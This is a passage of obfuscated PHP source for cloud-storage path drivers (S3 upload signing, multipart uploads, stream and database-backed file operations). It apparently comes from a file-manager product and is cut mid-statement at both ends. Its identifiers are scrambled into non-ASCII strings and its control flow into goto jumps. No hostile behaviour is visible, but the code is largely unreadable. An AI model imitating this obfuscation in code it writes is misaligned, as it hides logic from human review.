$this->bucketManager->listFiles($this->bucket, trim($e∑ÇÙ¶áâ≥, $D¢Ω”¯ãáù[8]) . $D¢Ω”¯ãáù[8], $D¢Ω”¯ãáù[33], 1, $D¢Ω”¯ãáù[8]); return !empty($eíø«ç∫•ë[$D¢Ω”¯ãáù[1314]]) || !empty($eíø«ç∫•ë[$D¢Ω”¯ãáù[1315]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($f–éï¯◊„°) { parent::__construct($f–éï¯◊„°); } public function uploadFormData($aâÚ¥Ùæ§ö, $a—Íıê≥äÏ = 3600) { goto f Ùë·∞ˆÂ; B∏Ïı¶Ï˘∫: $f≈á‰Œ¢óƒ = $C…êüﬁ˜ﬁª[59]; $B±€óπì∞ê = gmdate($C…êüﬁ˜ﬁª[1233]); $eççÁÕÙºª = gmdate($C…êüﬁ˜ﬁª[730]); goto A¥˘€‘Èﬁ; f Ùë·∞ˆÂ: $C…êüﬁ˜ﬁª =& $_SERVER[™⁄»üÆ]; $Fó…Ü∆∆ÑŸ = $C…êüﬁ˜ﬁª[192]; $C°¥ÏÊê˜Œ = $C…êüﬁ˜ﬁª[1232]; goto B∏Ïı¶Ï˘∫; A¥˘€‘Èﬁ: $D˘å¢íê¡ª = $C…êüﬁ˜ﬁª[1234]; $B°◊ó„ö◊é = $a—Íıê≥äÏ . $C…êüﬁ˜ﬁª[33]; $c√”Ç ÊÜ∏ = $C…êüﬁ˜ﬁª[1197]; goto Cñè¿≥°†å; Cñè¿≥°†å: $d≈Û…©≈¨Á = array($this->accessKey, $eççÁÕÙºª, $this->region, $f≈á‰Œ¢óƒ, $D˘å¢íê¡ª); $d„ëàÔ•— = implode($C…êüﬁ˜ﬁª[8], $d≈Û…©≈¨Á); $EÀ¥ñä®‡π = array($C…êüﬁ˜ﬁª[1199] => gmdate($C…êüﬁ˜ﬁª[1198], strtotime($C…êüﬁ˜ﬁª[1235])), $C…êüﬁ˜ﬁª[1200] => array(array($C…êüﬁ˜ﬁª[1202] => $this->bucket), array($C…êüﬁ˜ﬁª[1201] => $Fó…Ü∆∆ÑŸ), array($C…êüﬁ˜ﬁª[1203], $C…êüﬁ˜ﬁª[1204], $C…êüﬁ˜ﬁª[33]), array($C…êüﬁ˜ﬁª[1203], $C…êüﬁ˜ﬁª[1236], $C…êüﬁ˜ﬁª[33]), array($C…êüﬁ˜ﬁª[1203], $C…êüﬁ˜ﬁª[1237], $C…êüﬁ˜ﬁª[33]), array($C…êüﬁ˜ﬁª[1205] => $c√”Ç ÊÜ∏), array($C…êüﬁ˜ﬁª[1238] => $d„ëàÔ•—), array($C…êüﬁ˜ﬁª[1239] => $C°¥ÏÊê˜Œ), array($C…êüﬁ˜ﬁª[1240] => $B±€óπì∞ê), array($C…êüﬁ˜ﬁª[1241] => $B°◊ó„ö◊é))); goto b¢ÚÆˆ¨›ò; b¢ÚÆˆ¨›ò: $A∏£µÏÏΩÓ = base64_encode(json_encode($EÀ¥ñä®‡π)); $CÃŒº◊ÜΩÖ = hash_hmac($C…êüﬁ˜ﬁª[1242], $eççÁÕÙºª, $C…êüﬁ˜ﬁª[1243] . $this->secret, !0); $F±£è≤ì„ı = hash_hmac($C…êüﬁ˜ﬁª[1242], $this->region, $CÃŒº◊ÜΩÖ, !0); goto câÁé≤Ã§≤; dÍóå÷§Õ»: $DòÊ∞Ì†õ‚ = array($C…êüﬁ˜ﬁª[211] => $C…êüﬁ˜ﬁª[33], $C…êüﬁ˜ﬁª[1244] => $C…êüﬁ˜ﬁª[33], $C…êüﬁ˜ﬁª[1201] => $Fó…Ü∆∆ÑŸ, $C…êüﬁ˜ﬁª[1205] => $c√”Ç ÊÜ∏, $C…êüﬁ˜ﬁª[1209] => $A∏£µÏÏΩÓ, $C…êüﬁ˜ﬁª[1245] => $d„ëàÔ•—, $C…êüﬁ˜ﬁª[1246] => $C°¥ÏÊê˜Œ, $C…êüﬁ˜ﬁª[1247] => $B±€óπì∞ê, $C…êüﬁ˜ﬁª[1248] => $B°◊ó„ö◊é, $C…êüﬁ˜ﬁª[1249] => $d‚ÜœÎ›∑ˆ, $C…êüﬁ˜ﬁª[175] => $this->getHost()); return $DòÊ∞Ì†õ‚; goto E±∞Û¢»≥»; câÁé≤Ã§≤: $A∫˘Ëıü∏¯ = hash_hmac($C…êüﬁ˜ﬁª[1242], $f≈á‰Œ¢óƒ, $F±£è≤ì„ı, !0); $Cèü∆∫ãç™ = hash_hmac($C…êüﬁ˜ﬁª[1242], $D˘å¢íê¡ª, $A∫˘Ëıü∏¯, !0); $d‚ÜœÎ›∑ˆ = hash_hmac($C…êüﬁ˜ﬁª[1242], $A∏£µÏÏΩÓ, $Cèü∆∫ãç™); goto dÍóå÷§Õ»; E±∞Û¢»≥»: } public function multiUploadFormData($d◊∫÷æ©¶‰, $D≠£ΩŸÉè· = 3600) { $FÂ¯¬õ≤¿´ =& $_SERVER[™⁄»üÆ]; $EæÒ÷›ßÓ« = gmdate($FÂ¯¬õ≤¿´[1326]); $eÒ™Ãú˘çà = array(); $bŒêÁî¨Ú† = $this->client->getUploadId($this->bucket, $d◊∫÷æ©¶‰, $eÒ™Ãú˘çà); if (!$bŒêÁî¨Ú†) { return !1; } return array($FÂ¯¬õ≤¿´[221] => $bŒêÁî¨Ú†, $FÂ¯¬õ≤¿´[175] => $this->getHost() . $FÂ¯¬õ≤¿´[8] . $this->pathEncode($d◊∫÷æ©¶‰), $FÂ¯¬õ≤¿´[222] => $EæÒ÷›ßÓ«, $FÂ¯¬õ≤¿´[93] => $d◊∫÷æ©¶‰); } public function multiUploadAuthData($E∂∑ºÕåÒá, $f¢©Ç∂‘◊Ø = array()) { goto dÍ∞âØ¨çë; dÍ∞âØ¨çë: $C›Û˜éÉò√ =& $_SERVER[™⁄»üÆ]; $b⁄Ç•ˆºØÆ = isset($f¢©Ç∂‘◊Ø[$C›Û˜éÉò√[168]]) ? $f¢©Ç∂‘◊Ø[$C›Û˜éÉò√[168]] : $C›Û˜éÉò√[33]; $aµáÑÑØ‹¥ = $f¢©Ç∂‘◊Ø[$C›Û˜éÉò√[93]]; goto fÙâãó¬ê; Dîëß≠ÔÒ°: if (strpos($b⁄Ç•ˆºØÆ, $C›Û˜éÉò√[225]) === 0) { if (isset($eÔ∏¶‘â—≠[$C›Û˜éÉò√[1328]])) { $DíˆßÿÙø◊ = $eÔ∏¶‘â—≠[$C›Û˜éÉò√[1328]]; } else { if (isset($A¬Ü¯ÀÇπÑ[$C›Û˜éÉò√[1328]])) { $DíˆßÿÙø◊ = $A¬Ü¯ÀÇπÑ[$C›Û˜éÉò√[1328]]; } else { $DíˆßÿÙø◊ = hash($C›Û˜éÉò√[1242], $C›Û˜éÉò√[33]); } } return array($C›Û˜éÉò√[232] => $A¬Ü¯ÀÇπÑ[$C›Û˜éÉò√[232]], $C›Û˜éÉò√[1328] => $DíˆßÿÙø◊, $C›Û˜éÉò√[222] => $A¬Ü¯ÀÇπÑ[$C›Û˜éÉò√[1331]]); } return $A¬Ü¯ÀÇπÑ[$C›Û˜éÉò√[232]]; goto aÏÑ¢äú¡Î; fÙâãó¬ê: unset($f¢©Ç∂‘◊Ø[$C›Û˜éÉò√[93]]); if (isset($f¢©Ç∂‘◊Ø[$C›Û˜éÉò√[223]])) { return $this->listUploadParts($aµáÑÑØ‹¥, $f¢©Ç∂‘◊Ø); } $eÔ∏¶‘â—≠ = array(); goto d∫¨ç´ºÈ¶; d∫¨ç´ºÈ¶: if (isset($f¢©Ç∂‘◊Ø[$C›Û˜éÉò√[1327]])) { $eÔ∏¶‘â—≠[$C›Û˜éÉò√[1328]] = $f¢©Ç∂‘◊Ø[$C›Û˜éÉò√[1327]]; } $F€àüÈ†≤Ö = explode($C›Û˜éÉò√[177], $this->getHost()); $FºÒú‡Ë‡Æ = array($C›Û˜éÉò√[1329] => $F€àüÈ†≤Ö[1], $C›Û˜éÉò√[1330] => $C›Û˜éÉò√[33], $C›Û˜éÉò√[211] => $C›Û˜éÉò√[119], $C›Û˜éÉò√[1244] => $f¢©Ç∂‘◊Ø[$C›Û˜éÉò√[78]]); goto d‘”«‹Ù£Ñ; d‘”«‹Ù£Ñ: $a÷Ñ‘ä–ùÌ = $C›Û˜éÉò√[226]; $A‹òò¥áÔ = $C›Û˜éÉò√[8] . $this->pathEncode($aµáÑÑØ‹¥) . $b⁄Ç•ˆºØÆ; $A¬Ü¯ÀÇπÑ = $this->client->__getSignatureV4($eÔ∏¶‘â—≠, $FºÒú‡Ë‡Æ, $a÷Ñ‘ä–ùÌ, $A‹òò¥áÔ); goto Dîëß≠ÔÒ°; aÏÑ¢äú¡Î: } public function listUploadParts($Eá⁄Ó˜˜Ÿú, $Dñ«ÚΩ¯§≈ = array()) { goto B¬´Âá¬¬ƒ; bü–Â„∆˜Ì: $FΩé±±î§ .= $f˘â£å∏µ¿[1335]; $b™‘ÿ¡ òß = array(); $a·◊Ç¿ßª¶ = explode($f˘â£å∏µ¿[177], $this->getHost()); goto c‚†øåı∂ú; AëÌ‡¨®Ü”: if (!$b‘ñ¿≈˜ãü) { return !1; } $FΩé±±î§ = $f˘â£å∏µ¿[1332]; foreach ($b‘ñ¿≈˜ãü as $a√è°ø‰Ï“) { $FΩé±±î§ .= $f˘â£å∏µ¿[1333] . "\x3c\x50\141\162\164\116\x75\155\x62\145\x72\x3e{$a√è°ø‰Ï“[$f˘â£å∏µ¿[1289]]}\74\x2f\120\141\x72\x74\116\x75\155\x62\145\162\x3e\xa" . "\x3c\x45\124\141\x67\76{$a√è°ø‰Ï“[$f˘â£å∏µ¿[1290]]}\74\57\x45\124\x61\147\76\12" . $f˘â£å∏µ¿[1334]; } goto bü–Â„∆˜Ì; B¬´Âá¬¬ƒ: $f˘â£å∏µ¿ =& $_SERVER[™⁄»üÆ]; $E„¯†£„ÉÀ = str_replace($f˘â£å∏µ¿[233], $f˘â£å∏µ¿[33], $Dñ«ÚΩ¯§≈[$f˘â£å∏µ¿[168]]); $b‘ñ¿≈˜ãü = $this->client->listParts($this->bucket, $Eá⁄Ó˜˜Ÿú, $E„¯†£„ÉÀ); goto AëÌ‡¨®Ü”; c‚†øåı∂ú: $D∂ª´™∑Ø– = array($f˘â£å∏µ¿[1329] => $a·◊Ç¿ßª¶[1], $f˘â£å∏µ¿[211] => $f˘â£å∏µ¿[119], $f˘â£å∏µ¿[1244] => strlen($FΩé±±î§)); $a–Œ¿Öëì≠ = $f˘â£å∏µ¿[224]; $f„â„≤Îè„ = $f˘â£å∏µ¿[8] . $this->pathEncode($Eá⁄Ó˜˜Ÿú) . $Dñ«ÚΩ¯§≈[$f˘â£å∏µ¿[168]]; goto A®∑üöüœï; A®∑üöüœï: $cÑﬁ•°îéû = $this->client->__getSignatureV4($b™‘ÿ¡ òß, $D∂ª´™∑Ø–, $a–Œ¿Öëì≠, $f„â„≤Îè„, $FΩé±±î§); return array($f˘â£å∏µ¿[232] => $cÑﬁ•°îéû[$f˘â£å∏µ¿[232]], $f˘â£å∏µ¿[222] => $cÑﬁ•°îéû[$f˘â£å∏µ¿[1331]], $f˘â£å∏µ¿[234] => $b‘ñ¿≈˜ãü, $f˘â£å∏µ¿[1328] => $cÑﬁ•°îéû[$f˘â£å∏µ¿[1328]]); goto eé¯‘´òﬂÉ; eé¯‘´òﬂÉ: } public function link($Cú®∏ÑïÒò, $d“¯ßÉó∂  = array()) { return parent::link($Cú®∏ÑïÒò, $d“¯ßÉó∂ ); } public function fileOut($d†‡∑ÛÜ≈ç, $a¨°Ñï©„Œ = false, $CÉ€åƒºÂ‡ = false, $eèÖíù¥™ì = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[™⁄»üÆ][1336])) { return parent::fileOutServer($d†‡∑ÛÜ≈ç, $a¨°Ñï©„Œ, $CÉ€åƒºÂ‡, $eèÖíù¥™ì); } parent::fileOut($d†‡∑ÛÜ≈ç, $a¨°Ñï©„Œ, $CÉ€åƒºÂ‡, $eèÖíù¥™ì); } public function fileOutImage($F…ò°°ÚÔÛ, $F·‚ÃÙÌâõ = 250) { if (strstr($this->endpoint, $_SERVER[™⁄»üÆ][1336])) { return parent::fileOutImageServer($F…ò°°ÚÔÛ, $F·‚ÃÙÌâõ); } parent::fileOutImage($F…ò°°ÚÔÛ, $F·‚ÃÙÌâõ); } public function fileOutLink($C¯Œ…‰”–◊) { $a†•ﬂ∆”àù =& $_SERVER[™⁄»üÆ]; if (substr($C¯Œ…‰”–◊, 0, 7) == $a†•ﬂ∆”àù[1212]) { $C¯Œ…‰”–◊ = $a†•ﬂ∆”àù[1213] . substr($C¯Œ…‰”–◊, 7); } header($a†•ﬂ∆”àù[159] . $C¯Œ…‰”–◊); die; } public function getHost() { $a–»Øﬁ„ß∆ =& $_SERVER[™⁄»üÆ]; $F∂€≠ºΩ¶â = str_rtrim(parent::getHost(), $a–»Øﬁ„ß∆[8] . $this->bucket); $F∂€≠ºΩ¶â = explode($a–»Øﬁ„ß∆[177], $F∂€≠ºΩ¶â); return $F∂€≠ºΩ¶â[0] . $a–»Øﬁ„ß∆[177] . $this->bucket . $a–»Øﬁ„ß∆[95] . $F∂€≠ºΩ¶â[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($bÆ‰®ù ““, $Dñ∫∑œ¢¬Î = 0) { parent::__construct(); $this->source = $bÆ‰®ù ““; $this->sourceSize = $Dñ∫∑œ¢¬Î; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Bÿ€íœÙ√ò = false) { return $this->sourceSize; } public function getContent($Dì¡ûáÑëÓ = false) { return $this->fileSubstr($Dì¡ûáÑëÓ, 0, $this->sourceSize); } public function fileSubstr($bÁÀøÌ∞∑‡ = false, $a± Ÿ∑ãä´ = 0, $e∂√±âö≈† = 0) { if (!$e∂√±âö≈†) { $e∂√±âö≈† = $this->sourceSize; } $eì«∆Á≠Ñé = $this->sourceSize - $a± Ÿ∑ãä´; if ($e∂√±âö≈† >= $eì«∆Á≠Ñé) { $e∂√±âö≈† = $eì«∆Á≠Ñé; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $a± Ÿ∑ãä´, $e∂√±âö≈†); } if ($this->sourceType == self::TYPE_FILE) { if ($e∂√±âö≈† <= 0) { return $_SERVER[™⁄»üÆ][33]; } $d˘◊°ßÏìë = ftell($this->source); fseek_64($this->source, $d˘◊°ßÏìë + $a± Ÿ∑ãä´); $bÙ≈Æ∏ºö  = @fread($this->source, $e∂√±âö≈†); fseek_64($this->source, $d˘◊°ßÏìë); return $bÙ≈Æ∏ºö ; } } public function hashMd5($dº˜˜èﬁ≠Ø = false) { return md5($this->getContent()); } public static function hash($B√à º‰ûá, $A ΩòÕê» = 0) { $eÇíÀë„á‚ = new PathDriverStream($B√à º‰ûá, $A ΩòÕê»); return $eÇíÀë„á‚->hashSimple($B√à º‰ûá); } public static function md5($bÕçè¯º◊ì, $aâÇπıﬂÏè = 0) { $f»π™ãöû  = new PathDriverStream($bÕçè¯º◊ì, $aâÇπıﬂÏè); return $f»π™ãöû ->hashMd5($bÕçè¯º◊ì); } } goto F Ü¯ñ„È‰; Dß”Ìã∫ﬂ›: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($f∏é∞÷‹∆´) { $this->pathParse = $f∏é∞÷‹∆´; $this->model = Model($_SERVER[™⁄»üÆ][1214]); } public function getPath($EÈÙ∂Ééö™) { return trim($EÈÙ∂Ééö™, $_SERVER[™⁄»üÆ][8]); } public function pathFather($B„¬÷…–éﬁ) { $a≈–ﬂâ‹µµ = $this->parse($B„¬÷…–éﬁ); $a≈–ﬂâ‹µµ = $this->infoSimple($B„¬÷…–éﬁ); return $a≈–ﬂâ‹µµ ? $a≈–ﬂâ‹µµ[$_SERVER[™⁄»üÆ][479]] : !1; } public function pathThis($A∞å√¬û¡Ç) { $bŸ‚¢±¯‡Ù = $this->infoSimple($A∞å√¬û¡Ç); return $bŸ‚¢±¯‡Ù ? $bŸ‚¢±¯‡Ù[$_SERVER[™⁄»üÆ][28]] : !1; } public function getPathOuter($e™üÁ‰‹¯ì) { if (!$e™üÁ‰‹¯ì) { return $e™üÁ‰‹¯ì; } $C‹§Ü©Öáú = $this->parse($e™üÁ‰‹¯ì); return KodIO::make($C‹§Ü©Öáú[$_SERVER[™⁄»üÆ][394]]); } public function copyFolderFromIO($dìÛπàß›Î, $aﬁÛ¨¶ÃôÔ, $Eê’ÜíÖÈ«, $FÎ±ﬂ∫Â”⁄, $C§Õªâ»‰Œ) { $C≈Ò√ª∑ˆ‘ = $this->model->copyFolderFromIO($dìÛπàß›Î, $aﬁÛ¨¶ÃôÔ, $Eê’ÜíÖÈ«, $FÎ±ﬂ∫Â”⁄, $C§Õªâ»‰Œ); return KodIO::make($C≈Ò√ª∑ˆ‘); } public function isParentOf($EéïÏˆìﬁ±, $AËë÷©ûﬂ£) { return $this->model->isParentOf($EéïÏˆìﬁ±, $AËë÷©ûﬂ£); } public function mkfile($e™éﬁ±ÕáÚ, $e£◊ŒÜ£Õ° = '', $D•ÎÑ â≤Ô = REPEAT_RENAME) { $bñûö‹äßö =& $_SERVER[™⁄»üÆ]; $BÊåÇ±Ï‚ = $this->parse($e™éﬁ±ÕáÚ); $e™éﬁ±ÕáÚ = $BÊåÇ±Ï‚[$bñûö‹äßö[394]]; for ($fÊ⁄∫ﬂÌ†— = 0; $fÊ⁄∫ﬂÌ†— < count($BÊåÇ±Ï‚[$bñûö‹äßö[1215]]); $fÊ⁄∫ﬂÌ†—++) { $cøºêä¡˜Ø = $BÊåÇ±Ï‚[$bñûö‹äßö[1215]][$fÊ⁄∫ﬂÌ†—]; if ($fÊ⁄∫ﬂÌ†— == count($BÊåÇ±Ï‚[$bñûö‹äßö[1215]]) - 1) { $e™éﬁ±ÕáÚ = $this->model->mkfile($e™éﬁ±ÕáÚ, $cøºêä¡˜Ø, $e£◊ŒÜ£Õ°, $D•ÎÑ â≤Ô); break; } $e™éﬁ±ÕáÚ = $this->model->mkdir($e™éﬁ±ÕáÚ, $cøºêä¡˜Ø, REPEAT_SKIP); } return $this->getPathOuter($e™éﬁ±ÕáÚ); } public function mkdir($Dø…˘ëÎüÕ, $e≥î°Âœ‘Á = REPEAT_SKIP) { $AÛ£ó∏ËïÓ =& $_SERVER[™⁄»üÆ]; $F…»Íêƒ»Ì = $this->parse($Dø…˘ëÎüÕ); $Dø…˘ëÎüÕ = $F…»Íêƒ»Ì[$AÛ£ó∏ËïÓ[394]]; for ($Aö∫é·ÈË“ = 0; $Aö∫é·ÈË“ < count($F…»Íêƒ»Ì[$AÛ£ó∏ËïÓ[1215]]); $Aö∫é·ÈË“++) { $F’Œ‘†“øº = $F…»Íêƒ»Ì[$AÛ£ó∏ËïÓ[1215]][$Aö∫é·ÈË“]; $Dø…˘ëÎüÕ = $this->model->mkdir($Dø…˘ëÎüÕ, $F’Œ‘†“øº, $e≥î°Âœ‘Á); } return $this->getPathOuter($Dø…˘ëÎüÕ); } public function copyFile($D√Ñêò»≈à, $Aåà»ŒÖÜø, $Bé≈∞Æ´ñô = REPEAT_REPLACE) { $cú Çﬁ§’˜ =& $_SERVER[™⁄»üÆ]; $cçôè…∂Á€ = $this->parse($Aåà»ŒÖÜø); $E⁄¨Ï∏Öü” = $this->model->copy($D√Ñêò»≈à, $cçôè…∂Á€[$cú Çﬁ§’˜[394]], $Bé≈∞Æ´ñô, $cçôè…∂Á€[$cú Çﬁ§’˜[76]]); return $E⁄¨Ï∏Öü” ? $this->getPathOuter($E⁄¨Ï∏Öü”) : !1; } public function moveFile($aäøΩÉ◊Ë´, $d◊¿®”äá∏, $B‘∂∫ªº¨… = REPEAT_REPLACE) { $D–©ë≤…ôÔ =& $_SERVER[™⁄»üÆ]; $EçÉπâøï = $this->parse($d◊¿®”äá∏); $c⁄¬©©≤Òè = $this->model->move($aäøΩÉ◊Ë´, $EçÉπâøï[$D–©ë≤…ôÔ[394]], $B‘∂∫ªº¨…, $EçÉπâøï[$D–©ë≤…ôÔ[76]]); return $c⁄¬©©≤Òè ? $this->getPathOuter($c⁄¬©©≤Òè) : !1; } public function copy($Fé‘…ÁçÑ€, $d·∞î⁄≠‹Ÿ, $b§®ÿÂãé¿ = REPEAT_REPLACE) { $eéí‰ÑÀ¨ı = $this->parse($d·∞î⁄≠‹Ÿ); $E°®˜˜≥Ü¨ = $this->model->copy($Fé‘…ÁçÑ€, $eéí‰ÑÀ¨ı[$_SERVER[™⁄»üÆ][394]], $b§®ÿÂãé¿); return $E°®˜˜≥Ü¨ ? $this->getPathOuter($E°®˜˜≥Ü¨) : !1; } public function moveSameAllow() { } public function move($eﬂäŒÂæªâ, $e®ùÑ…¨åß, $Dö°â¬üè¥ = REPEAT_REPLACE) { $cÕ ø˘ﬁä¶ = $this->parse($e®ùÑ…¨åß); $fï¿ºÖ¨ç… = $this->model->move($eﬂäŒÂæªâ, $cÕ ø˘ﬁä¶[$_SERVER[™⁄»üÆ][394]], $Dö°â¬üè¥); return $fï¿ºÖ¨ç… ? $this->getPathOuter($fï¿ºÖ¨ç…) : !1; } public function remove($Bÿ™ÙÁù“â, $DÛüïÊöÌê = true) { return $this->model->remove($Bÿ™ÙÁù“â, $DÛüïÊöÌê); } public function rename($FÛ‰ˆ∞êÕ—, $c¢†âÍô¬ë) { $b◊Ω‰ùÇ≈Ã = $this->model->rename($FÛ‰ˆ∞êÕ—, $c¢†âÍô¬ë); return $b◊Ω‰ùÇ≈Ã ? $this->getPathOuter($FÛ‰ˆ∞êÕ—) : $b◊Ω‰ùÇ≈Ã; } public function size($F´â’£éò´) { $CÓÿñøì™Î = $this->infoSimple($F´â’£éò´); return $CÓÿñøì™Î ? $CÓÿñøì™Î[$_SERVER[™⁄»üÆ][78]] : 0; } public function infoSimple($CÀÏÿ⁄‚üˆ) { return $this->model->sourceInfo($CÀÏÿ⁄‚üˆ); } public function info($A™ÿóƒ¯∫Œ) { return $this->infoParse($A™ÿóƒ¯∫Œ); } public function infoAuth($FóÕ∫ï¿‰£) { return $this->infoParse($FóÕ∫ï¿‰£, !1, !0); } public function infoWithChildren($fÿÑéΩÉåÑ) { return $this->infoParse($fÿÑéΩÉåÑ, !0); } protected function infoParse($cª˜ÙâîñÖ, $BÖî®†ß∏Ω = false, $aå◊µıú≠ô = false) { if (!$BÖî®†ß∏Ω) { return $this->model->pathInfo($cª˜ÙâîñÖ, $aå◊µıú≠ô); } return $this->model->pathInfoMore($cª˜ÙâîñÖ); } public function infoFull($Fú¯›’íãé) { $A‹⁄‰Âàû® =& $_SERVER[™⁄»üÆ]; $fÙ≈É—éê§ = explode($A‹⁄‰Âàû®[8], $Fú¯›’íãé); $dñïœ˜œââ = implode($A‹⁄‰Âàû®[8], array_splice($fÙ≈É—éê§, 1)); return $this->model->pathInfoByPath($fÙ≈É—éê§[0], $dñïœ˜œââ); } public function hashSimple($AèÑß˜Ï√Ø) { $f∫áÖü‹àÆ =& $_SERVER[™⁄»üÆ]; $eÎ ºÃ®◊√ = $this->infoWithChildren($AèÑß˜Ï√Ø); return $eÎ ºÃ®◊√[$f∫áÖü‹àÆ[164]][$f∫áÖü‹àÆ[171]]; } public function hashMd5($c∆ÑÑåàÂ…) { $DçÖåñó◊Ï =& $_SERVER[™⁄»üÆ]; $Bïäœ™ûÛÕ = $this->infoWithChildren($c∆ÑÑåàÂ…); return $Bïäœ™ûÛÕ[$DçÖåñó◊Ï[164]][$DçÖåñó◊Ï[170]]; } public function exist($eáÈ¡åèÒ») { $BÊ·±Õ¶Óë =& $_SERVER[™⁄»üÆ]; $d∂Ø≈í¬´ﬂ = $this->parse($eáÈ¡åèÒ»); if (!$d∂Ø≈í¬´ﬂ[$BÊ·±Õ¶Óë[76]]) { return $this->isFile($eáÈ¡åèÒ») || $this->isFolder($eáÈ¡åèÒ»); } $bå≥ù£ñ‚≈ = array($BÊ·±Õ¶Óë[395] => $d∂Ø≈í¬´ﬂ[$BÊ·±Õ¶Óë[394]], $BÊ·±Õ¶Óë[28] => $d∂Ø≈í¬´ﬂ[$BÊ·±Õ¶Óë[76]]); $féóÿ∆ŸÙË = $this->model->where($bå≥ù£ñ‚≈)->find(); return $féóÿ∆ŸÙË ? !0 : !1; } public function isFile($cöçÀ˘ç¥ç) { $EÒ∫∏óáàπ =& $_SERVER[™⁄»üÆ]; $E◊©›Öû£± = $this->infoSimple($cöçÀ˘ç¥ç); return $E◊©›Öû£± && $E◊©›Öû£±[$EÒ∫∏óáàπ[404]] == $EÒ∫∏óáàπ[87] ? !1 : !0; } public function isFolder($bü ﬂ—£©) { $Aç¢ÓÁ¬Ω” =& $_SERVER[™⁄»üÆ]; $D∫éÀ€“Öê = $this->infoSimple($bü ﬂ—£©); return $D∫éÀ€“Öê && $D∫éÀ€“Öê[$Aç¢ÓÁ¬Ω”[404]] == $Aç¢ÓÁ¬Ω”[87] ? !0 : !1; } public function listPath($c™»Æ„ıÜ‘, $eâÙñ…¯ñ› = false) { $cÂ∏ü“»Õó =& $_SERVER[™⁄»üÆ]; if ($c™»Æ„ıÜ‘ == $cÂ∏ü“»Õó[33]) { return !1; } $dÜ˘ÑêÊ∫˘ = array($cÂ∏ü“»Õó[395] => $c™»Æ„ıÜ‘); if ($eâÙñ…¯ñ›) { return $this->model->listSource($dÜ˘ÑêÊ∫˘, -1); } return $this->model->listSource($dÜ˘ÑêÊ∫˘); } public function has($c∆µ£Çà‹Û, $C—†Ô™ÿ¨Õ = false, $AªÖπÉ±üê = null) { $còÙ®ÕÊâ– =& $_SERVER[™⁄»üÆ]; $dπóø´‚µ´ = $this->infoWithChildren($c∆µ£Çà‹Û); if ($C—†Ô™ÿ¨Õ) { return array($còÙ®ÕÊâ–[204] => $dπóø´‚µ´[$còÙ®ÕÊâ–[204]], $còÙ®ÕÊâ–[203] => $dπóø´‚µ´[$còÙ®ÕÊâ–[203]]); } return $AªÖπÉ±üê ? $dπóø´‚µ´[$còÙ®ÕÊâ–[204]] : $dπóø´‚µ´[$còÙ®ÕÊâ–[203]]; } public function listAll($EÔÇ≤ºù‘Ë) { $c’≤€ÿÑõò = IO::info($this->pathParse[$_SERVER[™⁄»üÆ][76]]); if (!$c’≤€ÿÑõò) { return array(); } return $this->model->listAll($EÔÇ≤ºù‘Ë); } public function getContent($b≠èÜÎ≥∞ó) { return $this->model->getContent($b≠èÜÎ≥∞ó); } public function setContent($D›•àÍñ™÷, $DóÎ‘≠µ‰® = '') { return $this->model->setContent($D›•àÍñ™÷, $DóÎ‘≠µ‰®); } public function fileSubstr($d¿óµ§‹‘å, $eä≠ÑÆó”„, $aåæà‹ÏË≈) { return $this->model->fileSubstr($d¿óµ§‹‘å, $eä≠ÑÆó”„, $aåæà‹ÏË≈); } public function download($A—∑ùâà∆¥, $Dúä«êö§´ = '') { $E•‰ÓêÛÍÑ = get_path_father($Dúä«êö§´); $C‹Öã∞≤™Ü = get_path_this($Dúä«êö§´); $CîèÍ…ìãﬂ = $this->model->fileInfoGet($A—∑ùâà∆¥); $DÃ‚‹…Ÿ†à = IO::copy($CîèÍ…ìãﬂ[$_SERVER[™⁄»üÆ][76]], $E•‰ÓêÛÍÑ, !1, $C‹Öã∞≤™Ü); return $DÃ‚‹…Ÿ†à; } public function setModifyTime($B©±œœˆ¿ñ, $dƒ≥ª⁄§®∏ = '') { $D∂ô√œÌÚÚ =& $_SERVER[™⁄»üÆ]; if (!$B©±œœˆ¿ñ) { return; } $this->model->where(array($D∂ô√œÌÚÚ[411] => $B©±œœˆ¿ñ))->save(array($D∂ô√œÌÚÚ[84] => $dƒ≥ª⁄§®∏)); } public function upload($dÙéÚôØ◊È, $BàìÇäúó, $b±√≠ç◊ñ« = false, $D—¬À≥◊‚â = REPEAT_REPLACE) { $Cÿ˜¿≥û˜¯ =& $_SERVER[™⁄»üÆ]; $FƒÀ»æÜ≠¿ = $this->parse($dÙéÚôØ◊È); $B“ﬂ®®ŸÁÍ = $this->model->addFile($FƒÀ»æÜ≠¿[$Cÿ˜¿≥û˜¯[394]], $BàìÇäúó, $FƒÀ»æÜ≠¿[$Cÿ˜¿≥û˜¯[76]], $b±√≠ç◊ñ«, $D—¬À≥◊‚â); return $this->getPathOuter($B“ﬂ®®ŸÁÍ); } public function uploadFileByID($E¢√Ò®éú, $FãÕàÁÛ”ë, $dﬂêÍ∑Éß) { $e∆ﬁêŸ∫Û… =& $_SERVER[™⁄»üÆ]; $CùƒÉºÔäª = $this->parse($E¢√Ò®éú); $fΩßÚ≥ÃÌ“ = $this->model->addFileByFileID($CùƒÉºÔäª[$e∆ﬁêŸ∫Û…[394]], $FãÕàÁÛ”ë, $CùƒÉºÔäª[$e∆ﬁêŸ∫Û…[76]], $dﬂêÍ∑Éß); return $this->getPathOuter($fΩßÚ≥ÃÌ“); } public function addFileByRemote($büÃæ†ëêÆ, $FÃÍá¶Ï∏, $C≤””æ‰Æ¨ = array(), $eÂ’¿é°Ï∆ = '', $d∏Û®Ã˘◊Ç) { $C±Êπ≠•≈ö =& $_SERVER[™⁄»üÆ]; $fò‹≤ƒ’Ï— = $this->parse($büÃæ†ëêÆ); $eÂ’¿é°Ï∆ = empty($eÂ’¿é°Ï∆) ? $fò‹≤ƒ’Ï—[$C±Êπ≠•≈ö[76]] : $eÂ’¿é°Ï∆; $Bƒµä‡ΩıŒ = $this->model->addFileByRemote($fò‹≤ƒ’Ï—[$C±Êπ≠•≈ö[394]], $FÃÍá¶Ï∏, $eÂ’¿é°Ï∆, $C≤””æ‰Æ¨, $d∏Û®Ã˘◊Ç); return 